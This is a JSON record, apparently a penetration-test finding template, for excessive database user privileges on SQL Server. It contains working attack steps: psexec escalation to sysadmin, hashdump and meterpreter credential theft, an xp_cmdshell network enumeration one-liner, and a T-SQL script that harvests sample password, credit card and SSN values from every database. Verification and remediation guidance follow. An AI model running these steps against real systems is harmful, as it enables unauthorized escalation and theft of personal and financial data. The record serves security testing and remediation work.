{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":690117,"exploitInstructions":"[escalation from local admin to sysadmin in sql server 2k8 and 2k12]\n- get a cmd shell and use osql:    \n- - psexec -s -i cmd \n-- osql -E -S .\\sqlexpress -Q \"select is_srvrolemember('sysadmin')\"\n-get management gui\n-- psexec -s -i ssms\n\n\n[Check for shared service accounts, and sql express instances with the builtin\\users group]\nFollow standard windows escalation, and database crawling techniques.\n\n#1 - Verify local systems access with xp_cmdshell\n#2 - Determine if service account is domain admin\n#3 - Escalate locally using 'run hashdump', cachdump, rainbow tables, meterpreter psexec module, and incognito\n#4 - Crawl databases with domain admin that has dbadmin priv, or shared service account using the following script\n\n-- note: Enumerate databases that use a shared \n-- SQL Server service accounts via xp_cmdshell and osql.  \n-- You can open data_servers.txt to get list. - Note: you can specifiy a username and password if need with -u and -p switches, but remember to remove -E if you do that\n\nEXEC master..xp_cmdshell 'FOR /F %a IN (''osql -L'') DO osql ?E ?S %a ?Q \"select @@Servername as Server_Name\" -h-1 -s \",\" -w500 >> database_servers.txt';\n\n\n\n#5 - Find senstive data on each server with the script below - Note: this can be wrapped in the previous script\n\n/*\n -------------------------------------------------\n Cursor1 \n Enumerate columns from each database that \n contain keywords and write them to a temp table\n -------------------------------------------------\n*/\nDECLARE @var1 varchar(max)\nDECLARE @var2 varchar(max)\nDECLARE @var3 varchar(max)\nDECLARE @var4 varchar(max)\nDECLARE MY_CURSOR CURSOR\nFOR\n\nSELECT name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb')\n\nOPEN MY_CURSOR\nFETCH NEXT FROM MY_CURSOR INTO @var1\nWHILE @@FETCH_STATUS = 0   \nBEGIN  \n\nSET @var2 = ' \nUSE master\nIF OBJECT_ID(''tempdb..##mytable'') IS NULL \nBEGIN \nCREATE TABLE ##mytable (\nserver_name varchar(MAX),\ndatabase_name varchar(MAX),\ntable_name varchar(MAX),\ncolumn_name varchar(MAX)\n) \nEND \nINSERT INTO ##mytable\nSELECT @@SERVERNAME as SERVER_NAME,TABLE_CATALOG as DATABASE_NAME,TABLE_NAME,COLUMN_NAME \nFROM '+@var1+'.INFORMATION_SCHEMA.COLUMNS WHERE \nCOLUMN_NAME like ''%pwd%'' or \nCOLUMN_NAME like ''%pass%'' or \nCOLUMN_NAME like ''%ccn%'' or \nCOLUMN_NAME like ''%credit%'' or \nCOLUMN_NAME like ''%card%'' or\nCOLUMN_NAME like ''%ssn%'' or \nCOLUMN_NAME like ''%social%''\n'\nEXEC(@var2);\n\nFETCH NEXT FROM MY_CURSOR INTO @var1\n\nEND   \nCLOSE MY_CURSOR\nDEALLOCATE MY_CURSOR\n\n/*\n -------------------------------------------------\n Cursor2\n Take a 5 record sample from each potential \n column\n Note: This will not return any empty tables.\n -------------------------------------------------\n*/\nDECLARE @var_server varchar(max)\nDECLARE @var_database varchar(max)\nDECLARE @var_table varchar(max)\nDECLARE @var_column varchar(max)\nDECLARE @myquery varchar(max)\nDECLARE MY_CURSOR CURSOR\nFOR\n\nSELECT server_name,database_name,table_name,column_name FROM ##mytable\n\nOPEN MY_CURSOR\nFETCH NEXT FROM MY_CURSOR INTO @var_server,@var_database,@var_table,@var_column\nWHILE @@FETCH_STATUS = 0   \nBEGIN  \n\nSET @myquery = ' \nUSE master\nIF OBJECT_ID(''tempdb..##mytable2'') IS NULL \nBEGIN \nCREATE TABLE ##mytable2 (\nserver_name varchar(MAX),\ndatabase_name varchar(MAX),\ntable_name varchar(MAX),\ncolumn_name varchar(MAX),\ncolumn_value varchar(MAX)\n) \nEND \nINSERT INTO ##mytable2 (server_name,database_name,table_name,column_name,column_value)\nSELECT TOP 5 '''+@var_server+''' as server_name,'''+@var_database+''' as database_name,''\n'+@var_table+''' as table_name,'''+@var_column+''' as comlumn_name,'+@var_column+'\nFROM '+@var_database+'..'+@var_table+' WHERE '+@var_column+' IS NOT NULL'\nEXEC(@myquery);\n\nFETCH NEXT FROM MY_CURSOR INTO @var_server,@var_database,@var_table,@var_column\n\nEND   \nCLOSE MY_CURSOR\nDEALLOCATE MY_CURSOR\n\nselect * from ##mytable2\n\nDROP TABLE","verificationInstructions":"Two tests (three if access directly on the internal network\n1- Check if the current application database user has the syadmin fixed server role\n2- Check if the current application database user has access to other databases\n3- Check if the current application database user has access to dangerous functions - Only perform this test if the database is accessible directly via the internal network.\n\n\n<ol><li>1 - Check if the current application database user has the syadmin fixed server role</li>\n</ol>\n\nselect is_srvrolemember('sysadmin')\n\n<ol><li>2 Check if the current application database user has access to other databases</li>\n</ol>\n\n--The command below will provide a list of all of the databases,tables,and columns on the database server\nsp_msforeachdb 'select TABLE_CATALOG as DATABASE_NAME,TABLE_NAME,COLUMN_NAME from DB_DBworm.INFORMATION_SCHEMA.COLUMNS'\n\n--The command below will allow you  to select data from identified tables and tables.\nselect &#42; from &lt;db&gt;..&lt;tablename&gt;\n\n<ol><li>3- Check if the current application database user has access to dangerous functions - Only perform this test if the database is accessible directly via the internal network.</li>\n</ol>\n\nRun SCUBA against the remote database server to identify additional configuration issues.  http://www.imperva.com/products/dle_downloads-and-evaluations-overview.html\n","remediationInstructions":"Use the principle of least privilege when configuring database user accounts. Only provide database users with the privileges necessary to perform functions associated with their role.\n\nDo not provide database users with privileges that allow them to directly access the database.  Create a set of procedures that can be used to perform all of the functions necessary for the role.  Once they have been created, only provide the user with execute permissions to those procedures.  This will allow the user to perform necessary functions while ensuring they do not have excessive privileges to the database.\n","name":"Excessive Privileges - Database User","sourceId":"M:690117","severity":"Medium","businessImpact":"Excessive privileges on the database account used by the application may allow provide a threat agent with the means to gain unauthorized access to sensitive information and database functionality.  In the event of an incident revenue could be loss due to brand damage, fines, and penalties.","description":"At least one database user was discovered that has been configured with excessive privileges.\n"}}}